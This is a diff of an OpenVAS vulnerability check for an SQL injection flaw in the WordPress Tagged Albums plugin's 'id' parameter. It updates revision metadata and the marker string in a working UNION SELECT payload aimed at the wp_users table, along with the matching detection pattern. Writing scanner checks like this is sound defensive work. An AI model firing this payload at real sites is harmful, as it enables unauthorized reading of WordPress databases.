@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_tagged_albums_plugin_sql_inj_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
+# $Id: gb_wordpress_tagged_albums_plugin_sql_inj_vuln.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # WordPress Tagged Albums Plugin 'id' Parameter SQL Injection Vulnerability
 #
@@ -29,7 +29,7 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803051");
-  script_version("$Revision: 11374 $");
+  script_version("$Revision: 11435 $");
   script_bugtraq_id(56569);
   script_tag(name:"last_modification", value:"$Date: 2017-04-24 11:02:24 +0200 (Mo, 24 Apr 2017)$");
   script_tag(name:"creation_date", value:"2012-11-19 11:18:38 +0530 (Mon, 19 Nov 2012)");
@@ -77,9 +77,9 @@ if(!port = get_app_port(cpe:CPE)) exit(0);
 if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
 
 if(dir == "/") dir = "";
-url = dir + '/wp-content/plugins/taggedalbums/image.php?id=-5/**/union/**/select/**/1,group_concat(0x6F70656E7661732D73716C2D74657374,0x3a,@@version),3,4,5,6,7,8/**/from/**/wp_users--';
+url = dir + '/wp-content/plugins/taggedalbums/image.php?id=-5/**/union/**/select/**/1,group_concat(0x73716C692D74657374,0x3a,@@version),3,4,5,6,7,8/**/from/**/wp_users--';
 
-if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"openvas-sql-test:[0-9]+.*:openvas-sql-test", extra_check:">Gallery")){
+if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"sqli-test:[0-9]+.*:sqli-test", extra_check:">Gallery")){
   report = report_vuln_url(port:port, url:url);
   security_message(port:port, data:report);
   exit(0);
